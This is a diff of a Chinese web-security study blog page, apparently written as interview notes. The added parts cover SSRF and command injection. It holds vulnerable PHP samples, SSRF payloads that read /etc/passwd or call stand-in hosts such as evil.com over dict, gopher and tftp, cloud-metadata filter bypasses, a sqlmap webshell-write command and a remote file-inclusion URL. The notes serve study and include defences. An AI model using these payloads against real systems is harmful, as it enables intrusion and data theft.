@@ -40,9 +40,9 @@
       s.parentNode.insertBefore(hm, s);
     })();
     </script>
-<meta name="generator" content="Hexo 6.3.0">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="DU-玉" type="application/atom+xml">
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="DU-玉" type="application/atom+xml">
 </head>
 
 
@@ -647,21 +647,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-03
+                    2023-08-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    24.6k
+                    29.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    89 分
+                    107 分
                 </div>
                 
 
@@ -696,21 +696,20 @@
 5.安全配置错误
 6.敏感信息泄露
 7.缺少功能级的访问控制
-8.跨站请求伪造CSRF
+8.跨站请求伪造CSRF 
 9.实验含有已知漏洞的组件
 10.未验证的重定向和转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="一、sql注入"><a href="#一、sql注入" class="headerlink" title="一、sql注入"></a>一、sql注入</h2><p>sql注入的<strong>原理</strong>：<strong>利用应用程序没有正确过滤或转义用户输入的数据</strong>，<strong>导致恶意用户可以在 应用的查询语句中插入自己的SQL代码并传递</strong></p>
-<p><strong>给后台SQL服务器时加以解析并执行</strong>。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p>
+<p><strong>给后台SQL服务器 时加以解析并执行</strong>。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p>
 <pre class="line-numbers language-none"><code class="language-none">把用户输入的数据当作代码执行。 
-
-包含两个关键条件： 一：用户能够控制输入；二：原本程序要执行的代码，拼接了用户输入的数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+包含两个关键条件： 一：用户能够控制输入；二：原本程序要执行的代码，拼接了用户输入的数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。</p>
 <p>因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。</p>
-<p><strong>sql的类型有什么</strong>：</p>
+<p><strong>sql的类型有什么</strong>    ：</p>
 <p>常见（联合查询，布尔，延时，报错），其他（宽字节，堆叠，等等）</p>
 <pre class="line-numbers language-none"><code class="language-none">数字型、字符型、GRT 注入、POST 注入、cookie 注入、布尔盲注、时间盲注、延时注入、编码注入、联合查询注入、堆查询注入等
 
@@ -755,7 +754,7 @@
 <li>盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以<strong>利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</strong></li>
 <li>基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向<strong>查询结果集中添加用户列表或密码信息。</strong></li>
 <li>基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，<strong>该查询会返回一个布尔值</strong>，例如真或假。攻击者可以<strong>利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</strong></li>
-<li>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过<strong>向查询中添加时间延迟语句来判断查询是否成功执行</strong>。例如，攻击者可以使用 <strong>SLEEP()</strong> 函数来强制查询等待一段时间，在等待期间<strong>观察程序的响应时间来确定注入点是否存在</strong>。</li>
+<li>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过<strong>向查询中添加时间延迟语句来判断查询是否成功执行</strong>。例如，攻击者可以使用 <strong>SLEEP()</strong> 函数 来强制查询等待一段时间，在等待期间<strong>观察程序的响应时间来确定注入点是否存在</strong>。</li>
 </ol>
 <p>总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 注入漏洞的出现。</p>
 <p><strong>1、sql注入延时函数sleep禁用怎么办：</strong></p>
@@ -764,7 +763,7 @@
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170738154.png" alt="image-20230731170738154"></p>
 <p><strong>报错注入函数</strong></p>
 <p>报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。</p>
-<p>您提到的“报错注入函数”，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p>
+<p>您提到的“报错注入函数” ，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p>
 <ol>
 <li>substring() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</li>
 </ol>
@@ -1063,35 +1062,205 @@ sqlmap -u "http://target.com/page.php?id=1" --file-write="/var/www/shell.php" --
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802111259860.png" alt="image-20230802111259860"></p>
 <p>php中有<strong>CSP</strong>，java应该应该也有类似的，开启后没法进行外站应用</p>
 <p>通常出现在数据处理的地方，账户登录，转账，修改信息</p>
-<h2 id="一、SSRF"><a href="#一、SSRF" class="headerlink" title="一、SSRF"></a>一、SSRF</h2><p>SSRF 的工作原理</p>
-<ol>
-<li><strong>攻击者构造特定请求</strong>：攻击者构造特定的请求，该请求被发送到目标应用服务器。</li>
-<li><strong>目标服务器向内部资源发起请求</strong>：目标应用服务器接收到攻击者的请求后，被引导向内部资源发起请求。</li>
-<li><strong>收集敏感信息</strong>：通过构造的请求，攻击者可能能够访问服务器无法直接访问的内部资源，如数据库、缓存服务器、内部网络等。</li>
-<li><strong>执行进一步攻击</strong>：利用 SSRF，攻击者甚至可以绕过防火墙，执行进一步的攻击，例如对内部服务进行端口扫描、远程命令执行等。</li>
-</ol>
-<p>SSRF 攻击的常见场景</p>
+<h2 id="一、SSRF"><a href="#一、SSRF" class="headerlink" title="一、SSRF"></a>一、SSRF</h2><p><strong>漏洞成因</strong></p>
+<p>1.服务端提供了从其他服务器应用获取数据的功能</p>
+<p>2.没有对目标地址做过滤与限制</p>
+<p>比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载文件等等</p>
 <ul>
-<li>在 Web 应用中，通过 URL 参数来获取外部资源，如图片、文件等。</li>
-<li>使用服务器作为代理来访问第三方服务。</li>
-<li>通过 Webhooks 接收来自第三方服务的请求。</li>
-</ul>
-<p>SSRF 攻击的危害</p>
-<ul>
-<li>泄露内部网络架构和敏感信息。</li>
-<li>进行端口扫描和远程命令执行。</li>
-<li>绕过 IP 白名单和防火墙。</li>
-<li>可能导致 DDoS 攻击。</li>
-</ul>
-<p>SSRF 的防护措施</p>
-<ul>
-<li>限制从服务器端发起的外部请求，特别是对内部资源的访问。</li>
-<li>对外部输入进行严格的校验和过滤。</li>
-<li>使用安全编程技术，避免使用用户的输入来直接构造请求。</li>
-<li>通过防火墙等安全措施，限制服务器对内部和外部资源的访问。</li>
-<li>对敏感操作进行适当的认证和授权。</li>
+<li><p>漏洞产生与危害</p>
+<p>在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数</p>
+<p>file_get_contents()</p>
+<pre class="line-numbers language-none"><code class="language-none">//file_get_contents是把文件写入字符串，当把url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取
+
+&lt;?php
+if(isset($_POST['url']))
+{
+    $content=file_get_contents($_POST['url']);
+    $filename='./images/'.rand().'.img';\
+    file_put_contents($filename,$content);
+    echo $_POST['url'];
+    $img="&lt;img src=\"".$filename."\"/&gt;";
+
+}
+echo $img;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>fsockopen()</p>
+<pre class="line-numbers language-none"><code class="language-none">//fsockopen()函数本身就是打开一个网络连接或者Unix套接字连接
+
+&lt;?php
+$host=$_GET['url'];
+$fp = fsockopen("$host", 80, $errno, $errstr, 30);
+if (!$fp) {
+    echo "$errstr ($errno)&lt;br /&gt;\n";
+} else {
+    $out = "GET / HTTP/1.1\r\n";
+    $out .= "Host: $host\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($fp, $out);
+    while (!feof($fp)) {
+        echo fgets($fp, 128);
+    }
+    fclose($fp);
+}
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>curl()</p>
+<pre class="line-numbers language-none"><code class="language-none">//利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于curl()函数的利用方式
+
+function curl($url){  
+    $ch = curl_init(); //  初始化curl连接句柄
+    curl_setopt($ch, CURLOPT_URL, $url); //设置连接URL
+    curl_setopt($ch, CURLOPT_HEADER, 0);  // 不输出头文件的信息
+    curl_exec($ch);   // 执行获取结果
+    curl_close($ch);  // 关闭curl连接句柄
+}
+
+$url = $_GET['url'];
+curl($url); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件</p>
+<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。<br>3、漏洞攻击方式</p>
+<pre><code>对外网，服务器所在内网，本地进行端口扫描（挨个试探），获取一些服务的banner信息
+攻击运行在内网或本地的应用程序
+对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)
+攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如strust2,SQli等)
+下载内网资源，利用file协议读取本地文件或资源等
+内部任意主机的任意端口发送精心构造的Payload
+DOS攻击（请求大文件，始终保持连接Keep-Alive Always）
+进行跳板
+利用Redis未授权访问，HTTP CRLF注入实现getshell
+</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">file:///  -- 本地文件传输协议，主要用于访问本地计算机中的文件
+dict://   -- 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628
+sftp://   -- SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）
+ldap://   -- 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议
+tftp://   -- 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机
+gopher:// -- 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802185129898.png" alt="image-20230802185129898"></p>
+<p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p>
+<pre><code>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
+dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
+sftp:// SSH文件传输协议或安全文件传输协议
+ldap:// 轻量级目录访问协议
+tftp:// 简单文件传输协议
+gopher:// 分布式文档传递服务，可使用gopherus生成payload
+</code></pre>
+<p>1、file</p>
+<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<pre><code>http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini
+</code></pre>
+<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<p>2、dict</p>
+<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<pre><code>http://example.com/ssrf.php?dict://evil.com:1337/
+evil.com:$ nc -lvp 1337
+Connection from [192.168.0.12] port 1337[tcp/*]
+accepted (family 2, sport 31126)CLIENT libcurl 7.40.0
+</code></pre>
+<p>3、sftp</p>
+<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<pre><code>http://example.com/ssrf.php?url=sftp://evil.com:1337/
+evil.com:$ nc -lvp 1337
+Connection from [192.168.0.12] port 1337[tcp/*]
+accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2
+</code></pre>
+<p>4、ldap://或ldaps:// 或ldapi://</p>
+<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<pre><code>http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
+</code></pre>
+<p>5、tftp://</p>
+<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<pre><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
+evil.com:# nc -lvup 1337
+Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3
+</code></pre>
+<p>6、gopher://</p>
+<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<pre><code>http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?&gt;
+evil.com:# nc -lvp 1337
+Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest
+</code></pre>
+<p><strong>六、SSRF漏洞利用（危害）</strong></p>
+<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。.</p>
+<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
+<p>http:192.168.64.144/phpmyadmin/<br>file:///D:/<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict://192.168.64.144:3306/info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a><br>七、SSRF绕过方式</p>
+<p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p>
+<p><strong>一、常见的绕过方式</strong></p>
+<p>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</p>
+<pre><code>可以尝试采用http基本身份认证的方式绕过
+如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异
+在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。
+</code></pre>
+<p>2.采用短网址绕过</p>
+<pre><code>比如百度短地址https://dwz.cn/
+</code></pre>
+<p>3.采用进制转换</p>
+<pre><code>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.
+</code></pre>
+<p>在这里插入图片描述<br>4.利用特殊域名</p>
+<pre><code>原理是DNS解析。xip.io可以指向任意域名，即
+127.0.0.1.xip.io，可解析为127.0.0.1
+(xip.io 现在好像用不了了，可以找找其他的)
+</code></pre>
+<p>5.利用[::]</p>
+<pre><code>可以利用[::]来绕过localhost
+http://169.254.169.254&gt;&gt;http://[::169.254.169.254]
+</code></pre>
+<p>6.利用句号</p>
+<pre><code>127。0。0。1 &gt;&gt;&gt; 127.0.0.1
+</code></pre>
+<p>7、CRLF 编码绕过</p>
+<pre><code>%0d-&gt;0x0d-&gt;\r回车
+%0a-&gt;0x0a-&gt;\n换行
+进行HTTP头部注入
+</code></pre>
+<p>example.com/?url=<a href="http://eval.com%0d%0aHOST:fuzz.com%0d%0a">http://eval.com%0d%0aHOST:fuzz.com%0d%0a</a> </p>
+<p>8.利用封闭的字母数字</p>
+<pre><code>利用Enclosed alphanumerics
+ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com
+http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
+⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
+⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
+⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
+Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
+ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
+⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
+⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+</code></pre>
+<p><strong>二、常见限制</strong></p>
+<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<pre><code>采用http基本身份认证的方式绕过，即@
+http://www.xxx.com@www.xxc.com
+</code></pre>
+<p>2.限制请求IP不为内网地址</p>
+<pre><code>当不允许ip为内网地址时：
+（1）采取短网址绕过
+（2）采取特殊域名
+（3）采取进制转换
+</code></pre>
+<p>3.限制请求只为http协议</p>
+<pre><code>（1）采取302跳转
+（2）采取短地址
+</code></pre>
+<p><strong>八、SSRF漏防御</strong></p>
+<p>通常有以下5个思路：</p>
+<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>
 <h2 id="一、XSS漏洞"><a href="#一、XSS漏洞" class="headerlink" title="一、XSS漏洞"></a>一、XSS漏洞</h2><p>原理：</p>
 <p>XSS 主要使用 javascript，javascript 可以非常灵活的操作 html、css 和浏览器。 </p>
 <p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p>
@@ -1130,6 +1299,84 @@ sqlmap -u "http://target.com/page.php?id=1" --file-write="/var/www/shell.php" --
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>write<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+<h2 id="二、命令执行漏洞"><a href="#二、命令执行漏洞" class="headerlink" title="二、命令执行漏洞"></a>二、命令执行漏洞</h2><p>命令执行漏洞是值攻击者可以随意执行系统命令，它属于高危漏洞之一，也属于代码执行的范畴。命令执行漏洞不仅存在 B/S 架构中，还在 C/S 架构中也常常遇到。</p>
+<p>应用有时需要调用一些执行系统命令的函数，如 PHP 的 system 、exec、shell_exec、passthru、proc_popen  等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
+<p><strong>命令执行漏洞的危害</strong></p>
+<ul>
+<li>继承 web 服务程序的权限去执行系统命令或读写文件</li>
+<li>反弹 Shell</li>
+<li>控制整个网站甚至控制服务器</li>
+<li>进一步内网渗透</li>
+</ul>
+<p><strong>命令执行漏洞的原理</strong></p>
+<p><strong>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 system、 exec、shell_exec 等，如果用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常的命令中， 造成命令执行漏洞。</strong></p>
+<p><strong>在操作系统中，“&amp;、|、||” 都可以作为命令连接符使用， 用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，从而造成漏洞。</strong></p>
+<p><strong>命令执行漏洞成因</strong></p>
+<ul>
+<li><p>代码层过滤不严格</p>
+<p>商业应用需要执行命令，商业应用的一些核心代码可能在二进制文件当中，在 web 应用中通过 system 函数调用。例如 system (“/bin/program –arg c194a9eg&lt;!– begin-inline-katexarg”);</p>
+</li>
+<li><p>系统漏洞造成命令注入</p>
+<p>例如 bash 破壳漏洞 (CVE-2014-6271)，如果我们控制执行的 bash 的环境变量，就可以通过破壳漏洞来执行任意代码。</p>
+</li>
+<li><p>第三方组件造成命令注入</p>
+<p>如 Wordpress，可以选择 ImageMagick 这个常用的 图片处理组件，处理用户上传图片时造成命令执行，如 JAVA 中 Struts2/ElasticsearchGroovy 等。</p>
+</li>
+</ul>
+<p><strong>命令执行漏洞常见函数</strong></p>
+<ul>
+<li><p>System 函数的语法是： system (string $command [, int &amp;end-inline-katex–&gt;return_var ] )</p>
+</li>
+<li><ul>
+<li>同 C 版本的 system () 函数一样</li>
+<li>本函数执行 command 参数所指定的命令，并且输出执行结果</li>
+<li>命令执行后的返回值为输出值的最后一行</li>
+<li>函数本身也会打印全部的输出值</li>
+</ul>
+</li>
+<li><p>Exec 函数的语法为：exec (string command [, array &amp;output [, int &amp;c194a9eg&lt;!– begin-inline-katexreturn_var]] )</p>
+</li>
+<li><ul>
+<li>这个函数的作用是执行 command 参数所指定的命令</li>
+<li>命令执行后的值为输出值的最后一行</li>
+<li>函数本身不会打印任何内容</li>
+</ul>
+</li>
+<li><p>Passthru 函数的语法为：passthru (string $command [, int &amp;end-inline-katex–&gt;return_var ] )</p>
+</li>
+<li><ul>
+<li>同 exec () 函数类似</li>
+<li>passthru () 函数也是用来执行外部命令 command 的</li>
+<li>当所执行的系统命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec () 或 system () 函数。</li>
+</ul>
+</li>
+<li><p>Shell_exec 函数的语法为： shell_exec (string $cmd)</p>
+</li>
+<li><ul>
+<li>cmd 是要执行的命令</li>
+<li>String 是参数的数据类型，也就是字符串。</li>
+<li>函数会在命令执行完成后将全部的输出值作为字符串输入返回值，本身并不打印任何信息。</li>
+<li>Shell_exec 函数的用法同反引号形同，注意是反引号（``）而不是普通单引号（’’）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>命令执行漏洞连接符</strong></p>
+<p>&amp;: 顺序执行多条命令，而不管命令是否执行成功</p>
+<p>&amp;&amp;: 逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令， 前面的命令执行失败，后面的命令不会执行，与 || 正好相反</p>
+<p>|: 显示后面命令的结果</p>
+<p>||: 逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。 前面的命令执行失败，后面的命令才会执行</p>
+<p><strong>命令执行漏洞防御</strong></p>
+<ul>
+<li><p>不执行外部的应用程序或命令</p>
+<p>尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在 执行 system、eval 等命令执行功能的函数前，要先确定参数内容。</p>
+</li>
+<li><p>使用 escapeshellarg 函数处理相关参数</p>
+<p>Escapeshellarg 函数会将任何引起参数或命令结束的字符进行转义</p>
+</li>
+<li><p>使用 safe_mode_exec_dir 执行可执行的文件路径</p>
+<p>将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文 件路径。</p>
+</li>
 </ul>
 <h2 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h2><p><strong>文件上传和命令执行，有看过相关日志吗？</strong></p>
 <p>文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。</p>
@@ -1268,67 +1515,6 @@ sqlmap -u "http://target.com/page.php?id=1" --file-write="/var/www/shell.php" --
 <p>注意：如果是包含远程服务器上的 PHP 文件，那么得到的是被远程服务器解析过的 PHP，所以在写一句话木马的 时候就不要做成 .php 的文件 ，一般做成 .txt 的文件，再让它包含过来。</p>
 <p>我们用 windows server 2003 服务器包含一个 Linux 上 的 phpinfo.php 文件，那么得到的就是 Linux 的 php 配置文件 ，而不是 Windows 上的 php 配置信息。</p>
 <p>我们已知 192.168.173.128 这台服务器中存在着文件包含漏洞，我们想要通过远程包含自己的服务器上的木马文件，首先，我们在自己的服务器  192.168.173.129 上新建一 个文件 2.txt。我们通过远程包含文件包含到 192.168.173.128 这台目标 服务器上，  包含的方式与本地包含的方式类似： <a target="_blank" rel="noopener" href="http://192.168.173.128/index.php?page=http://192">http://192.168.173.128/index.php?page=http://192</a>. 168.173.129/2.txt。然后我们访问，若看到页面显示正常，说明文件包含成功。</p>
